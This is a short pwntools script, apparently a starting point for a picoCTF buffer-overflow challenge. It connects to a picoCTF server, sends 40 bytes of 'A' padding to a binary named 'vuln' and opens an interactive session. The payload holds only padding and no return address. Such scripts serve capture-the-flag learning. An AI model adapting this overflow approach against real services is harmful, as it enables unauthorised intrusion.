from pwn import *

p = remote('saturn.picoctf.net', 59410)
elf = ELF('./vuln')

offset = 40
junk = b'A' * offset

payload = junk

p.sendline(payload)
p.interactive()
